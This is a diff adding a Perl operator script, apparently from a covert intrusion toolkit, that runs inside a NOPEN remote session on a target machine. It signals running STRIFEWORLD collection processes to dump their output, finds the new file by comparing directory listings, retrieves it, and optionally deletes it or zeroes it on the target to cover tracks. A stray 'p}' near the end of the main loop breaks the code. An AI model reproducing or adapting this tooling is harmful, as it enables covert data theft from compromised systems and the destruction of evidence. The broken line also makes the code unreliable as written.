@@ -1,0 +1,285 @@
+#!/usr/bin/env perl
+##
+$VER="2.0.1.2" ;
+# nopen seems happier with stderr in lsh runs
+#select STDERR ;
+$| = 1 ;
+
+# The location of the STRIFEWORLD collection file
+# and the STRIFEWORLD PID.
+my $swdir = "";
+my @swpidargv = ();
+
+my $pullfile = 0;
+my $deletefile = 0;
+my $zerofile = 0;
+
+myinit();
+
+# Get our current working directory and other useful stuff.
+($clientver,$histfile,$cmdoutfile,$localcwd,$nhome,$localpid,
+ $localppid,$serverver,$wdir,$targetos,$targetcwd,$thispid,
+ $targetppid,$targetport,$localport,@statusoutput) = parsestatus();
+ 
+#dbg("in autoswkill, using either cwd =$targetcwd= or dir =$swdir=");
+
+# Verify that the kill command is in our $PATH.
+($output,$nopenlines,@output) = nopenlss("-UFP","kill");
+foreach $filelisting (@output) {
+  ($filename) = grep m, /.*/kill$, , split(/\n+/,$filelisting);
+#dbg("in autoswkill, got filename =$filename=");
+  mydie("kill command is not in the $PATH, bailing") unless ($filename);
+}
+
+# Build our PID grep string from the array of PIDs given.
+my $pidgrep = "@swpidargv";
+$pidgrep =~ s/ / | /g;
+$pidgrep = " $pidgrep ";
+
+# Find the STRIFEWORLD PID on target.
+my (@swpids,%swlines,
+    %nopenplines,
+    @psoutput) = ();
+$ignorefreebsdsetting=1;
+($output,$nopenlines,@psoutput) = doit("=ps");
+findpidsfor($pidgrep,
+	    \%swlines,
+	    \%nopenplines,
+	    "",
+	    @psoutput,
+	   );
+@swpids = keys %swlines;
+#dbg("in autoswkill, got swpids =@swpids=");
+
+
+mydie("PIDs not found: $pidgrep")
+  unless (@swpids);
+
+# Get the STRIFEWORLD directory listing.
+my $dir = $targetcwd;
+$dir = $swdir if (length $swdir);
+($output,$nopenlines,@output) = nopenlss("-UFQ","$dir");
+#dbg("in autoswkill, output = =@output=");
+my $beforeoutput = "$output[-3]\n"."$output[-2]\n"."$output[-1]\n";
+my $beforefile = $1 if $output[-1] =~ m, .*$dir/(\S+)$,;
+
+
+# Show the STRFIEWORLD PID line to the user.
+my $listing = join("\n",uniqify_array(values %swlines));
+
+progprint(
+  ".\n\n".
+  "The following STRIFEWORLD instances are currently running on target:\n\n${COLOR_NORMAL}".
+  $listing.
+  "");
+
+progprint(
+  ".\n\n".
+  "${COLOR_NOTE}Directory listing of ${COLOR_FAILURE}$dir${COLOR_NOTE} prior to sending SW kill commands:${COLOR_NORMAL}\n\n".
+  $beforeoutput.
+  "");
+
+my $killlist = "";
+foreach $pid (@swpids) {
+  $killlist .= sprintf("kill -USR1 %d ; sleep 1 ; kill -USR2 %d ; sleep 2\n",$pid,$pid);
+}
+
+progprint(
+  ".\n\n".
+  "${COLOR_NOTE}Sending the following SW kill commands to this STRIFEWORLD instance:${COLOR_NORMAL}\n\n".
+  $killlist.
+  "\n");
+
+my $finaloutput = "";
+
+foreach $pid (@swpids) {
+  # Do the first set of kills.  
+  ($output,$nopenlines,@output) = doit("kill -USR1 $pid ; sleep 1 ; kill -USR2 $pid ; sleep 2");
+  
+  # Do the second set of kills.
+  ($output,$nopenlines,@killoutput) = doit("kill -USR1 $pid ; sleep 1 ; kill -USR2 $pid ; sleep 2");
+  @killoutput = (@output,@killoutput);
+
+  # Get the STRIFEWORLD directory listing again.
+  # NOTE: This will NOT find the new stuff if they have
+  # some badly dated future file in the directory.
+  ($output,$nopenlines,@output) = nopenlss("-UF","$dir");
+  #dbg("in autoswkill, output = =@output=");
+  my $afteroutput = "$output[-3]\n"."$output[-2]\n"."$output[-1]\n";
+  my $afterline = $output[-1];
+  my ($afterfilesize,$afterfile) =
+    $afterline =~ m,^\D+\s\d+\s\D+\s(\d+)\s+.* .*$dir/(\S+)$,;
+
+  my $waitcount = 4;
+  if ($beforefile ne $afterfile and
+      $afterfilesize == 0) {
+    progprint(".\n\n\nDelaying up to 8 seconds until file has some size...");
+    sleep 3;
+    while ($waitcount-=2 > 0 and
+	   $beforefile ne $afterfile and
+	   $afterfilesize == 0) {
+      ($afterline,$nopenlines,@output) = nopenlss("-UF","$dir/$afterfile");
+      ($afterfilesize,$afterfile) =
+	$afterline =~ m,^\D+\s\d+\s\D+\s(\d+)\s+.* .*$dir/(\S+)$,;
+      sleep 1;
+    }
+  }
+  sleep 1;
+  my $warn = "";
+  foreach $line (@killoutput) {
+    #dbg("in autoswkill, got line =$line=");
+    $warn .= $_ if $line;
+  }
+  if ($warn) {
+    mywarn("Got bad output from the kill command:\n$warn");
+    sleep 4;
+    next;
+  }
+
+  progprint(
+	    ".\n\n".
+	    "STRIFEWORLD instance on target:\n\n${COLOR_NORMAL}".
+	    $listing.
+	    "\n\n".
+	    "${COLOR_NOTE}Directory listing of ${COLOR_FAILURE}$dir ${COLOR_NOTE} after sending SW kill commands:${COLOR_NORMAL}\n\n".
+	    $afteroutput.
+	    "");
+
+  # If the last entry in the dir outputs isn't the same, we probably have our new file.
+  dbg("in autoswkill, beforefile = =$beforefile=, afterfile = =$afterfile=");
+  if ($beforefile ne $afterfile) {
+    $listing = ".\n\n".
+      "${COLOR_NOTE}Located STRIFEWORLD collect file ${COLOR_FAILURE}$afterfile${COLOR_NOTE} ".
+	"in directory listing:${COLOR_FAILURE}\n\n$afterline${COLOR_NORMAL}".
+	  "";
+
+    my $extraoutput = "";
+    if ($pullfile) {
+      if ($afterfilesize == 0) {
+	my $more = "/zeroing" if $zerofile;
+	my $deletemore = "\n$COLOR_FAILURE\nRemoving it (if you answer YES)."
+	  if $deletefile;
+	progprint($listing.
+		  "\n${COLOR_NOTE}\n".
+		  "Not retrieving$more 0 byte file from target, no need.".
+		  $COLOR_NORMAL.
+		  $deletemore);
+	doit("-rm $dir/$afterfile") if $deletefile;
+	next;
+      } else {
+	$extraoutput = "\n\n".
+	  "${COLOR_NOTE}Retrieving $afterfilesize byte file from target and storing it in ".
+	  "${COLOR_FAILURE}$opsniff${COLOR_NORMAL}";
+	$extraoutput .=
+	  "\n\n\t${COLOR_FAILURE}(truncating file after retrieval)${COLOR_NORMAL}"
+	  if ($zerofile);
+      }
+    }
+
+    $listing .= $extraoutput;
+    progprint($listing);
+  
+    # Now get the file from target.
+    next unless ($pullfile and $afterfilesize);
+    @nopengotfiles = ();
+    my @lssargs = ("-T50","-UFQGL$opsniff");
+    push(@lssargs,"-D") if $deletefile;
+    nopenlss(@lssargs,
+	     "$dir/$afterfile",
+	    );
+	  
+    doit("cat /dev/null > $dir/$afterfile") if $zerofile;
+  } else {
+    my $msg = "No new file appeared after kill sequence on $pid.";
+    $finaloutput .= $COLOR_FAILURE.$msg."$COLOR_NORMAL\n";
+    mywarn($msg);
+    sleep 3;
+  }
+p}
+
+progprint(".\n\n\n".$finaloutput);
+
+# End with true value as we require this script elsewhere.
+1;
+
+sub myinit {
+  # If $willautoport is already defined, we must have been called
+  # by another script via require. We do not re-do autoport stuff.
+  $calledviarequire = 0;
+  if ($willautoport and $socket) {
+    progprint("$prog called -gs swkill @ARGV");
+    $calledviarequire = 1;
+  } else {
+    $willautoport=1;
+    my $autoutils = "../etc/autoutils" ;
+    unless (-e $autoutils) {
+      $autoutils = "/current/etc/autoutils" ;
+    }
+    require $autoutils;
+    $prog =~ s/^auto/-gs /;
+    $| = 1;
+    $vertext = "$prog version $VER\n" ;
+    mydie("No user servicable parts inside.\n".
+	  "(I.e., noclient calls $prog, not you.)\n".
+	  "$vertext") unless ($nopen_rhostname and $nopen_mylog and
+			      -e $nopen_mylog);
+  }
+  $usagetext="
+Usage: $prog [-h]                       (prints this usage statement)
+
+NOT CALLED DIRECTLY
+
+$prog is run from within a NOPEN session via when \"-gs swkill\" is used.
+
+";
+  $gsusagetext="Usage: -gs swkill [OPTIONS] PID1 [ PID2... ]
+
+-gs swkill sends the right sequence of kill commands to one or more instances
+of STRIFEWORLD to cycle their output. It also does a before and after directory
+listing in the current working directory (or another directory on target,
+if specified), showing the new output file(s) dumped from STRIFEWORLD.
+
+The kill commands sent to STRIFEWORLD, in order, are:
+
+  kill -USR1 NN; sleep 1; kill -USR2 NN; sleep 2
+  kill -USR1 NN; sleep 1; kill -USR2 NN; sleep 2
+
+OPTIONS
+
+  -h/-v         Show help/Show version
+  -d dir	Do the file listings in this directory instead of NOPEN's
+  		current working directory
+  -g		If an output file is found, prompt to retrieve it from
+  		target and store it in $opsniff
+  -D		DELETE the output file from target after retrieving it
+  -z		Zero out the file using \'cat /dev/null\' instead of
+  		deleting it from target
+
+";
+  mydie("bad option(s)") if (! Getopts( "hvd:gDz" ) ) ;
+  
+  # Get the STRIFEWORLD directory and PIDs.
+  $swdir = $opt_d if $opt_d;
+  foreach (@ARGV) {
+    unless (/(\d+)/) {
+      mywarn("Ignoring bad argument: $_");
+      next;
+    }
+#dbg("in autoswkill, got pid = =$1=");
+    push(@swpidargv,$1);
+  }
+  usage() if ($opt_h or $opt_v or !($swpidargv[-1])) ;
+  
+  $pullfile = $opt_g if $opt_g;
+  $deletefile = $opt_D;
+  $zerofile = $opt_z;
+
+  mydie("Cannot specify -D and -z together on command line")
+    if ($deletefile and $zerofile);
+  mydie("-D/-z make no sense without -g")
+    if (($deletefile or $zerofile) and !$pullfile);
+
+  # If $socket is already defined, we must have been called
+  # by another script via require. We do not re-do autoport stuff.
+  $socket = pilotstart(quiet) unless $socket;
+} #myinit
